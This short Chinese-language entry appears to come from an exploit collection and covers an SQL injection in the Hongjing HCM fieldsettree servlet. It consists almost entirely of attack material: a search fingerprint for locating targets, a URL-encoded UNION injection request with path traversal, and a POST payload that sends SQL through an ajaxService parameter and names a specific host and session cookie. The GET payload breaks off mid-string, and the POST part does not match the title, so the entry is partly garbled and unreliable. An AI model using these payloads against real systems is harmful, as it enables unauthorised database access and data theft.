# 宏景HCM-fieldsettree-SQL注入

- **系统**：宏景HCM-fieldsettree　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="HJSOFT-HCM"`
- **请求**：`GET /templates/attestation/../../servlet/fieldsettree?flag=2&infor=1%27%20UNION%20ALL%20SELECT%2018%2CCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28CASE%20WHEN%20%28SYSDATETIME%28%29%3DSYSDATETIME%28%29%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%2BCH`

**请求体 / payload**
```
获取cookie
Host:
构造注入
POST /ajax/ajaxService HTTP/1.1
Host:crm1.dnt.com.cn
Cookie: JSESSIONID=8A569640D4EE7D518A536CC263DCBBB3
Content-Type: application/x-www-form-urlencoded
__type=extTrans&__xml={"functionId":"151211001137","sql":"select~20(select~20user)~20a~30~31~30~30~2c~31~20a~30~31~30~31~2c~31~20b~30~31~31~30~2c~31~20e~30~31~32~32~2c~31~20e~30~31a~31~2c~31~20dbase~2c~31~20a~30~30~30~30~20from~20operuser","nbase":"1"}
```